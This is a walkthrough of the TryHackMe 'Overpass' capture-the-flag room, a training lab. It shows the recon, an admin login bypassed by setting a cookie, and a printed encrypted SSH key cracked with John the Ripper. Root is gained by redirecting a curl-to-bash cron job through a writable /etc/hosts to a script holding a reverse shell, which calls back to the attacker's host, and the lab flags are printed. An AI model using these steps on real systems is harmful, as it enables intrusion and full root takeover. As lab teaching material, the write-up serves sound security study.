# Overpass
https://tryhackme.com/room/overpass

This room is focused on attacking a web server as well as analyzing the source code of a password manager.

## Recon
```
┌──(kali㉿kali)-[~/ctfs/overpass]
└─$ nmap -sC -sV 10.10.34.118 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-03 22:21 EDT
Nmap scan report for 10.10.34.118
Host is up (0.096s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I scan the server and identify two open ports. OpenSSH is being run on port 22 and a Golang HTTP server is being run on port 80.

I check out the Golang page, but nothing interesting is going on here.

![](1.png)

I run `feroxbuster -u http://10.10.34.118/ -w /usr/share/wordlists subdomains-top1million-110000.txt` discover some new directories and files.
```
http://10.10.34.118/admin => http://10.10.34.118/admin/
http://10.10.34.118/img => img/
http://10.10.34.118/main.js
http://10.10.34.118/img/overpass.png
http://10.10.34.118/img/overpass.svg
http://10.10.34.118/css/main.css
http://10.10.34.118/downloads => downloads/
http://10.10.34.118/aboutus => aboutus/
http://10.10.34.118/css/login.css
http://10.10.34.118/css/
http://10.10.34.118/css => css/
http://10.10.34.118/img/jose-fontano-pZld9PiPDno-unsplash.jpg
http://10.10.34.118/
http://10.10.34.118/downloads/src => src/
```
The `/admin` page draws my attention.

![](2.png)

I try some common credentials like `admin:password` and `admin:admin` with no luck. Instead, I check out the `login.js` page and I find something interesting.

```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

The `login` function sends the user's credentials to the `/api/login` endpoint and returns an error if your credentials are incorrect or sets a session token if your credentials are correct. We can abuse this to manually set our session token to `/admin` in hopes of bypassing the login form.

We can use our browser console to run the code under the else clause to gain access.
```js
Cookies.set("SessionToken","value") //the SessionToken value is not important in this case
window.location = "/admin"
```

Once we reload, we get a rsa private key meant for someone named James that we can use to login via SSH.

```
┌──(kali㉿kali)-[~/ctfs/overpass]
└─$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

## Logging In
I try to log in using the rsa private key, but it looks like there's a passphrase on the key.

```
┌──(kali㉿kali)-[~/ctfs/overpass]
└─$ ssh -i id_rsa james@10.10.34.118 
The authenticity of host '10.10.34.118 (10.10.34.118)' can't be established.
ED25519 key fingerprint is SHA256:FhrAF0Rj+EFV1XGZSYeJWf5nYG0wSWkkEGSO5b+oSHk.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:67: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.34.118' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

We can use `ssh2john` to generate a hash that we can then crack later with JohnTheRipper. 

```
┌──(kali㉿kali)-[~/ctfs/overpass]
└─$ ssh2john id_rsa > hash.txt

┌──(kali㉿kali)-[~/ctfs/overpass]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2025-06-03 18:52) 16.66g/s 222800p/s 222800c/s 222800C/s pink25..jackets
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Bingo, the passphrase for the rsa private key is `james13`. We can now SSH as James to the machine using the id_rsa key and passphrase.

## User Flag
```
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
```
We find the user flag relatively quickly.

## Privilege Escalation
If we take a look at `todo.txt`, we see some interesting notes for James.
```
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```
The final item on the list catches my attention. An "automated" build script immediately makes me think of a cronjob. I can check `/etc/crontab` to confirm my suspicion.

```
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user command
17 * * * * root    cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

As you see, there is a cronjob assigned to curl buildscript.sh from the overpass.thm server and execute it as root every minute. This is an especially vulnerable cronjob, because I can change the assigned IP for overpass.thm through `/etc/hosts`. 

I check if I have write permissions and I do.
```
james@overpass-prod:/etc$ ls -la | grep hosts
-rw-rw-rw-  1 root root        250 Jun 27  2020 hosts
```

Since I have write permissions, I can start the attack. I have to make some new directories to mimic the structure of the real overpass website.

```
┌──(kali㉿kali)-[~/ctfs/overpass]
└─$ mkdir /downloads/src/

┌──(kali㉿kali)-[~/ctfs/overpass/downloads/src]
└─$ echo '#!/bin/bash
quote> sh -i >& /dev/tcp/10.6.10.95/4444 0>&1' > buildscript.sh

┌──(kali㉿kali)-[~/ctfs/overpass]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Make sure to replace the localhost IP and assign your own IP to overpass.thm.

```
james@overpass-prod:/etc$ nano /etc/hosts

127.0.0.1 localhost
127.0.1.1 overpass-prod
[CHANGE THIS] overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Once we write and save the changes to `/etc/hosts`, we start a listener on our attacking machine.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.10.95] from (UNKNOWN) [10.10.217.198] 55264
sh: 0: can't access tty; job control turned off
# python3 --version
Python 3.6.9
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@overpass-prod:~# cd /root
root@overpass-prod:~# ls
buildStatus  builds  go  root.txt  src
root@overpass-prod:~# cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

We've completely rooted this CTF and obtained all of the flags!